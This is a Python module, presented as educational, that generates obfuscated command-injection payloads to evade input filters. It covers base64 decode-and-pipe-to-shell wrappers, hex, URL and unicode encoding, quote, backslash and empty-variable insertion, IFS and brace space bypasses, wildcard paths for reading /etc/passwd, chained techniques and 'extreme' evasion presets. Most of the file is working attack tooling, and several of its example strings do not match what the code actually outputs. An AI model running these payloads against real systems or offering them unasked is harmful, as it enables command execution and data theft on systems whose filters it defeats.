"""
Command Injection Obfuscation Module
Standard encoding and evasion techniques for educational purposes

Author: Security Research Team
Purpose: Demonstrate common filter bypass methods
"""

import base64
import urllib.parse
import binascii

class CommandObfuscator:
    """
    Standard obfuscation techniques for command injection payloads
    """
    
    def __init__(self):
        self.techniques_applied = []
    
    # ==================== ENCODING METHODS ====================
    
    def url_encode(self, payload, double=False):
        """
        URL encode payload to bypass string matching filters
        
        Args:
            payload (str): Base command injection string
            double (bool): Apply double encoding
        
        Returns:
            dict: Encoded payload with explanation
        """
        encoded = urllib.parse.quote(payload, safe='')
        
        if double:
            encoded = urllib.parse.quote(encoded, safe='')
            technique = 'Double URL Encoding'
            bypass_reason = 'Bypasses filters that decode once, vulnerable to double-decode'
        else:
            technique = 'URL Encoding'
            bypass_reason = 'Evades string-matching filters, server decodes before processing'
        
        return {
            'original': payload,
            'encoded': encoded,
            'technique': technique,
            'bypass_reason': bypass_reason,
            'detection': 'Easy for single encoding, Medium for double',
            'example': f"Input: {payload}\nEncoded: {encoded}"
        }
    
    def base64_encode(self, payload, wrapper='echo'):
        """
        Base64 encode payload - hides command content
        
        Args:
            payload (str): Base command
            wrapper (str): Shell wrapper method ('echo' or 'eval')
        
        Returns:
            dict: Base64 encoded payload
        """
        encoded = base64.b64encode(payload.encode()).decode()
        
        if wrapper == 'echo':
            final_payload = f"echo {encoded} | base64 -d | sh"
        else:  # eval
            final_payload = f"eval $(echo {encoded} | base64 -d)"
        
        return {
            'original': payload,
            'encoded': encoded,
            'final_payload': final_payload,
            'technique': 'Base64 Encoding',
            'bypass_reason': 'Command hidden during filter check, decoded at runtime',
            'detection': 'Medium - look for base64 patterns + decode pipes',
            'example': f"Original: {payload}\nBase64: {encoded}\nExecution: {final_payload}"
        }
    
    def hex_encode(self, payload):
        """
        Hex encode payload
        
        Args:
            payload (str): Base command
        
        Returns:
            dict: Hex encoded payload
        """
        hex_encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
        final_payload = f"$(printf \"{hex_encoded}\")"
        
        return {
            'original': payload,
            'hex_encoded': hex_encoded,
            'final_payload': final_payload,
            'technique': 'Hex Encoding',
            'bypass_reason': 'Path/command blacklists bypassed via hex representation',
            'detection': 'Hard - requires runtime analysis',
            'example': f"Original: {payload}\nHex: {hex_encoded}\nExecution: {final_payload}"
        }
    
    def unicode_encode(self, payload):
        """
        Unicode escape encoding
        
        Args:
            payload (str): Base command
        
        Returns:
            dict: Unicode encoded payload
        """
        unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        
        return {
            'original': payload,
            'encoded': unicode_encoded,
            'technique': 'Unicode Encoding',
            'bypass_reason': 'Character-level obfuscation',
            'detection': 'Medium',
            'note': 'Limited shell support, works in some contexts',
            'example': f"Original: {payload}\nUnicode: {unicode_encoded}"
        }
    
    # ==================== CHARACTER OBFUSCATION ====================
    
    def quote_injection(self, payload, quote_type='single'):
        """
        Inject quotes to break keyword matching
        
        Args:
            payload (str): Base command (e.g., 'cat')
            quote_type (str): 'single', 'double', or 'mixed'
        
        Returns:
            dict: Quote-obfuscated payload
        """
        if quote_type == 'single':
            obfuscated = "'{}'".format("''".join(payload))
            example = f"cat → c''a''t"
        elif quote_type == 'double':
            obfuscated = '"{}"'.format('""'.join(payload))
            example = f'cat → c""a""t'
        else:  # mixed
            result = []
            for i, char in enumerate(payload):
                if i % 2 == 0:
                    result.append(f"'{char}'")
                else:
                    result.append(f'"{char}"')
            obfuscated = ''.join(result)
            example = f"cat → 'c'\"a\"'t'"
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': f'{quote_type.title()} Quote Injection',
            'bypass_reason': 'Shell removes quotes, filter sees different string',
            'detection': 'Hard - requires shell parsing',
            'example': example
        }
    
    def backslash_escape(self, payload, positions='random'):
        """
        Insert backslash escapes to break word matching
        
        Args:
            payload (str): Base command
            positions (str): 'all', 'random', or 'middle'
        
        Returns:
            dict: Backslash-escaped payload
        """
        if positions == 'all':
            obfuscated = '\\'.join(payload)
        elif positions == 'middle':
            mid = len(payload) // 2
            obfuscated = payload[:mid] + '\\' + payload[mid:]
        else:  # random - just escape every other char
            obfuscated = ''.join([c + '\\' if i % 2 == 0 else c for i, c in enumerate(payload)])
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Backslash Escape Injection',
            'bypass_reason': 'Backslashes ignored by shell, breaks pattern matching',
            'detection': 'Hard',
            'example': f"cat → c\\at or ca\\t"
        }
    
    def variable_expansion(self, payload):
        """
        Use empty variable expansion for obfuscation
        
        Args:
            payload (str): Base command
        
        Returns:
            dict: Variable-expanded payload
        """
        # Insert $u (empty var) between characters
        obfuscated = '$u'.join(payload)
        setup = f"u='';"
        final_payload = setup + obfuscated
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'final_payload': final_payload,
            'technique': 'Variable Expansion Obfuscation',
            'bypass_reason': 'Empty variables expand to nothing, breaks string matching',
            'detection': 'Very Hard',
            'example': f"cat → $u=''c$ua$ut"
        }
    
    # ==================== SPACE BYPASSES ====================
    
    def space_to_ifs(self, payload):
        """
        Replace spaces with ${IFS} variable
        
        Args:
            payload (str): Command with spaces
        
        Returns:
            dict: IFS-substituted payload
        """
        obfuscated = payload.replace(' ', '${IFS}')
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'IFS Space Bypass',
            'bypass_reason': '$IFS expands to space (Internal Field Separator)',
            'detection': 'Medium',
            'example': f"cat /etc/passwd → cat${{IFS}}/etc/passwd"
        }
    
    def space_to_ifs_null(self, payload):
        """
        Replace spaces with $IFS$9 (with null parameter)
        
        Args:
            payload (str): Command with spaces
        
        Returns:
            dict: Advanced IFS substitution
        """
        obfuscated = payload.replace(' ', '$IFS$9')
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'IFS + Null Parameter Bypass',
            'bypass_reason': '$9 is null positional parameter, $IFS$9 = space',
            'detection': 'Hard',
            'example': f"cat /etc/passwd → cat$IFS$9/etc/passwd"
        }
    
    def space_to_redirect(self, payload):
        """
        Use input redirection to eliminate spaces
        
        Args:
            payload (str): Command with spaces (e.g., 'cat /etc/passwd')
        
        Returns:
            dict: Redirection-based bypass
        """
        parts = payload.split(' ', 1)
        if len(parts) == 2:
            obfuscated = f"{parts[0]}<{parts[1]}"
        else:
            obfuscated = payload
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Input Redirection Space Bypass',
            'bypass_reason': 'Input redirection < acts as separator',
            'detection': 'Medium',
            'example': f"cat /etc/passwd → cat</etc/passwd"
        }
    
    def space_to_brace(self, payload):
        """
        Use brace expansion to eliminate spaces
        
        Args:
            payload (str): Command with space (e.g., 'cat /etc/passwd')
        
        Returns:
            dict: Brace expansion bypass
        """
        parts = payload.split(' ', 1)
        if len(parts) == 2:
            obfuscated = f"{{{parts[0]},{parts[1]}}}"
        else:
            obfuscated = payload
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Brace Expansion Space Bypass',
            'bypass_reason': 'Brace expansion executes without separators',
            'detection': 'Hard',
            'example': f"cat /etc/passwd → {{cat,/etc/passwd}}"
        }
    
    # ==================== WILDCARD OBFUSCATION ====================
    
    def wildcard_path(self, payload):
        """
        Replace characters with wildcards in paths
        
        Args:
            payload (str): Command with path (e.g., 'cat /etc/passwd')
        
        Returns:
            dict: Wildcard-obfuscated payload
        """
        # Simple wildcard replacement strategy
        obfuscated = payload.replace('/etc/passwd', '/e??/p*wd')
        obfuscated = obfuscated.replace('/bin/', '/b??/')
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Wildcard Path Obfuscation',
            'bypass_reason': 'Shell glob expansion resolves wildcards',
            'detection': 'Hard',
            'example': f"cat /etc/passwd → cat /e??/pas?wd"
        }
    
    def wildcard_command(self, payload):
        """
        Obfuscate command itself with wildcards
        
        Args:
            payload (str): Full command
        
        Returns:
            dict: Command wildcard obfuscation
        """
        # Replace common commands with wildcards
        obfuscated = payload
        commands = {
            'cat': '/b??/c?t',
            'ls': '/b??/l?',
            'whoami': '/usr/b??/who?mi'
        }
        
        for cmd, wildcard in commands.items():
            if cmd in payload:
                obfuscated = obfuscated.replace(cmd, wildcard, 1)
                break
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Command Wildcard Obfuscation',
            'bypass_reason': 'Command path obfuscated via glob patterns',
            'detection': 'Very Hard',
            'example': f"cat → /b??/c?t"
        }
    
    # ==================== CASE MANIPULATION (WINDOWS) ====================
    
    def case_variation(self, payload, pattern='mixed'):
        """
        Vary case for Windows command bypass
        
        Args:
            payload (str): Command
            pattern (str): 'mixed', 'alternate', 'random'
        
        Returns:
            dict: Case-varied payload
        """
        if pattern == 'mixed':
            obfuscated = ''.join([c.upper() if i % 2 == 0 else c.lower() 
                                 for i, c in enumerate(payload)])
        elif pattern == 'alternate':
            obfuscated = ''.join([c.lower() if i % 2 == 0 else c.upper() 
                                 for i, c in enumerate(payload)])
        else:  # all caps then all lower alternating words
            words = payload.split()
            obfuscated = ' '.join([w.upper() if i % 2 == 0 else w.lower() 
                                  for i, w in enumerate(words)])
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Case Variation (Windows)',
            'bypass_reason': 'Windows commands are case-insensitive',
            'detection': 'Medium',
            'example': f"whoami → WhOaMi or wHoAmI",
            'note': 'Only effective on Windows systems'
        }
    
    # ==================== COMMENT INJECTION ====================
    
    def comment_injection(self, payload):
        """
        Insert comments to break patterns
        
        Args:
            payload (str): Base command
        
        Returns:
            dict: Comment-injected payload
        """
        # Insert null comments
        parts = payload.split(' ', 1)
        if len(parts) == 2:
            obfuscated = f"{parts[0]}<>$u{parts[1]}"  # Using null redirect
        else:
            obfuscated = payload
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Comment/Redirect Injection',
            'bypass_reason': 'Null redirects don\'t affect execution',
            'detection': 'Hard',
            'example': f"cat /etc/passwd → cat<>$u/etc/passwd"
        }
    
    # ==================== CHAINING METHODS ====================
    
    def chain_techniques(self, payload, techniques):
        """
        Apply multiple obfuscation techniques in sequence
        
        Args:
            payload (str): Base payload
            techniques (list): List of technique names
        
        Returns:
            dict: Multi-layer obfuscated payload
        """
        current = payload
        steps = []
        
        technique_map = {
            'url': self.url_encode,
            'base64': self.base64_encode,
            'hex': self.hex_encode,
            'quote': self.quote_injection,
            'backslash': self.backslash_escape,
            'variable': self.variable_expansion,
            'ifs': self.space_to_ifs,
            'wildcard': self.wildcard_path,
            'case': self.case_variation
        }
        
        for tech in techniques:
            if tech in technique_map:
                result = technique_map[tech](current)
                current = result.get('obfuscated', result.get('encoded', result.get('final_payload', current)))
                steps.append({
                    'step': len(steps) + 1,
                    'technique': result['technique'],
                    'output': current
                })
        
        return {
            'original': payload,
            'final_payload': current,
            'techniques_applied': techniques,
            'transformation_steps': steps,
            'detection': 'Very Hard - Multiple layers',
            'note': 'Layered obfuscation significantly increases evasion'
        }

# Obfuscation presets
OBFUSCATION_PRESETS = {
    'light': {
        'techniques': ['url'],
        'description': 'Light obfuscation - URL encoding only',
        'evasion_level': 'Low'
    },
    'medium': {
        'techniques': ['quote', 'ifs'],
        'description': 'Medium obfuscation - Quote + space bypass',
        'evasion_level': 'Medium'
    },
    'heavy': {
        'techniques': ['variable', 'wildcard', 'base64'],
        'description': 'Heavy obfuscation - Multiple layers',
        'evasion_level': 'High'
    },
    'extreme': {
        'techniques': ['backslash', 'variable', 'wildcard', 'base64'],
        'description': 'Extreme obfuscation - Maximum evasion',
        'evasion_level': 'Very High'
    }
}

def get_preset(preset_name):
    """Get obfuscation preset configuration"""
    return OBFUSCATION_PRESETS.get(preset_name, OBFUSCATION_PRESETS['light'])

if __name__ == '__main__':
    print("=" * 60)
    print("COMMAND INJECTION OBFUSCATION MODULE")
    print("=" * 60)
    
    obfuscator = CommandObfuscator()
    
    # Example usage
    test_payload = "; whoami"
    
    print("\n[TEST] URL Encoding:")
    result = obfuscator.url_encode(test_payload)
    print(result['example'])
    
    print("\n[TEST] Base64 Encoding:")
    result = obfuscator.base64_encode("whoami")
    print(result['example'])
    
    print("\n[TEST] Quote Injection:")
    result = obfuscator.quote_injection("cat")
    print(result['example'])
    
    print("\n[TEST] Space Bypass (IFS):")
    result = obfuscator.space_to_ifs("cat /etc/passwd")
    print(result['example'])
    
    print("\nAvailable presets:", list(OBFUSCATION_PRESETS.keys()))
